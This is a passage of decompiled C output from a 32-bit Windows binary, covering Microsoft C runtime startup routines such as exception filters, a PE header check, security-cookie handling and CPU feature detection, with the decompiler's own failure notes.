  ExceptionInfo.ExceptionRecord = (PEXCEPTION_RECORD)&v27;
  ExceptionInfo.ContextRecord = (PCONTEXT)&Dst;
  v9 = v8 == 1;
  SetUnhandledExceptionFilter(0);
  if ( !UnhandledExceptionFilter(&ExceptionInfo) && !v9 )
    sub_402D2F();
}

//----- (00402C6C) --------------------------------------------------------
signed int sub_402C6C()
{
  signed int result; // eax@2
  char Dst; // [sp+0h] [bp-44h]@1
  char v2; // [sp+2Ch] [bp-18h]@1
  unsigned __int16 v3; // [sp+30h] [bp-14h]@2

  memset(&Dst, 0, 0x44u);
  GetStartupInfoW((LPSTARTUPINFOW)&Dst);
  if ( v2 & 1 )
    result = v3;
  else
    result = 10;
  return result;
}

//----- (00402C9F) --------------------------------------------------------
bool sub_402C9F()
{
  HMODULE v0; // eax@1
  int v1; // ecx@3
  bool result; // al@7

  v0 = GetModuleHandleW(0);
  result = 0;
  if ( v0 )
  {
    if ( *(_WORD *)v0 == 23117 )
    {
      v1 = (int)v0 + *((_DWORD *)v0 + 15);
      if ( *(_DWORD *)v1 == 17744 && *(_WORD *)(v1 + 24) == 267 && *(_DWORD *)(v1 + 116) > 0xEu && *(_DWORD *)(v1 + 232) )
        result = 1;
    }
  }
  return result;
}

//----- (00402CE2) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_402CE2()
{
  return SetUnhandledExceptionFilter(TopLevelExceptionFilter);
}

//----- (00402CEE) --------------------------------------------------------
LONG __stdcall TopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  PEXCEPTION_RECORD v1; // eax@1
  ULONG_PTR v2; // eax@3
  int savedregs; // [sp+0h] [bp+0h]@0

  v1 = ExceptionInfo->ExceptionRecord;
  if ( ExceptionInfo->ExceptionRecord->ExceptionCode == -529697949 && v1->NumberParameters == 3 )
  {
    v2 = v1->ExceptionInformation[0];
    if ( v2 == 429065504 || v2 == 429065505 || v2 == 429065506 || v2 == 26820608 )
    {
      terminate(savedregs);
      __debugbreak();
      JUMPOUT(*(_DWORD *)sub_402D2F);
    }
  }
  return 0;
}
// 40304C: using guessed type int __stdcall terminate(_DWORD);

//----- (00402D2F) --------------------------------------------------------
void sub_402D2F()
{
  dword_410108 = 0;
}
// 410108: using guessed type int dword_410108;

//----- (00402D37) --------------------------------------------------------
int sub_402D37()
{
  int (**v0)(void); // esi@1
  int (*v1)(void); // edi@2
  int result; // eax@3

  v0 = (int (**)(void))&unk_40A6F4;
  if ( &unk_40A6F4 < &unk_40A6F4 )
  {
    do
    {
      v1 = *v0;
      if ( *v0 )
      {
        __guard_check_icall_fptr(*v0);
        result = v1();
      }
      ++v0;
    }
    while ( v0 < (int (**)(void))&unk_40A6F4 );
  }
  return result;
}
// 404130: using guessed type int (__thiscall *__guard_check_icall_fptr)(_DWORD);

//----- (00402D63) --------------------------------------------------------
int sub_402D63()
{
  int (**v0)(void); // esi@1
  int (*v1)(void); // edi@2
  int result; // eax@3

  v0 = (int (**)(void))&unk_40A6FC;
  if ( &unk_40A6FC < &unk_40A6FC )
  {
    do
    {
      v1 = *v0;
      if ( *v0 )
      {
        __guard_check_icall_fptr(*v0);
        result = v1();
      }
      ++v0;
    }
    while ( v0 < (int (**)(void))&unk_40A6FC );
  }
  return result;
}
// 404130: using guessed type int (__thiscall *__guard_check_icall_fptr)(_DWORD);

//----- (00402D90) --------------------------------------------------------
void __cdecl sub_402D90(int a1, int a2)
{
  void *v2; // esp@1
  unsigned int v3; // [sp-18h] [bp-18h]@1
  unsigned int *v4; // [sp-10h] [bp-10h]@1
  int (__cdecl *v5)(int, int, int, int); // [sp-4h] [bp-4h]@1

  v5 = sub_402DEB;
  v2 = alloca(a2);
  v3 = (unsigned int)&a2 ^ __security_cookie;
  v4 = &v3;
  JUMPOUT(__CS__, __security_cookie ^ a1);
}

//----- (00402DD6) --------------------------------------------------------
#error "402DE1: positive sp value has been found (funcsize=0)"

//----- (00402DEB) --------------------------------------------------------
int __cdecl sub_402DEB(int a1, int a2, int a3, int a4)
{
  return except_handler4_common(&__security_cookie, sub_402457, a1, a2, a3, a4);
}
// 402457: using guessed type int sub_402457();
// 402FC5: using guessed type int __cdecl except_handler4_common(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00402E0E) --------------------------------------------------------
int sub_402E0E()
{
  int v5; // edi@2
  int v11; // eax@3
  int v12; // edi@9
  int v13; // eax@11
  int v18; // eax@19
  int v20; // [sp+4h] [bp-24h]@2
  int v21; // [sp+8h] [bp-20h]@2
  int v22; // [sp+Ch] [bp-1Ch]@2
  int v23; // [sp+10h] [bp-18h]@2
  int v24; // [sp+14h] [bp-14h]@18
  int v25; // [sp+18h] [bp-10h]@2
  int v26; // [sp+1Ch] [bp-Ch]@2
  int v27; // [sp+20h] [bp-8h]@2
  int v28; // [sp+24h] [bp-4h]@2

  dword_41010C = 0;
  dword_40FD70 |= 1u;
  if ( IsProcessorFeaturePresent(0xAu) )
  {
    v25 = 0;
    _EAX = 0;
    dword_40FD70 |= 2u;
    dword_41010C = 1;
    __asm { cpuid }
    v26 = _EAX;
    v5 = _ECX ^ 0x6C65746E;
    v27 = _EDX ^ 0x49656E69;
    v28 = _EBX ^ 0x756E6547;
    _EAX = 1;
    __asm { cpuid }
    v20 = _EAX;
    v21 = _EBX;
    v22 = _ECX;
    v23 = _EDX;
    if ( v27 | v5 | v28
      || (v11 = v20 & 0xFFF3FF0, (v20 & 0xFFF3FF0) != 67264)
      && v11 != 132704
      && v11 != 132720
      && v11 != 198224
      && v11 != 198240
      && v11 != 198256 )
    {
      v12 = dword_410110;
    }
    else
    {
      v12 = dword_410110 | 1;
      dword_410110 |= 1u;
    }
    v13 = v22;
    v28 = v22;
    if ( v26 < 7 )
    {
      LOBYTE(_EBX) = v25;
    }
    else
    {
      _EAX = 7;
      __asm { cpuid }
      v20 = _EAX;
      v13 = v28;
      v21 = _EBX;
      v22 = _ECX;
      v23 = _EDX;
      if ( _EBX & 0x200 )
        dword_410110 = v12 | 2;
    }
    if ( v13 & 0x100000 )
    {
      dword_40FD70 |= 4u;
      dword_41010C = 2;
      if ( v13 & 0x8000000 )
      {
        if ( v13 & 0x10000000 )
        {
          __asm { xgetbv }
          v24 = v13;
          v25 = _EDX;
          if ( (v13 & 6) == 6 )
          {
            v18 = dword_40FD70 | 8;
            dword_41010C = 3;
            dword_40FD70 |= 8u;
            if ( _EBX & 0x20 )
            {
              dword_41010C = 5;
              dword_40FD70 = v18 | 0x20;
            }
          }
        }
      }
    }
  }
  return 0;
}
// 40FD6C: using guessed type int dword_40FD6C;
// 40FD70: using guessed type int dword_40FD70;
// 41010C: using guessed type int dword_41010C;
// 410110: using guessed type int dword_410110;

//----- (00402FA7) --------------------------------------------------------
BOOL sub_402FA7()
{
  return dword_40FD74 != 0;
}
// 40FD74: using guessed type int dword_40FD74;

#error "There were 2 decompilation failure(s) on 65 function(s)"
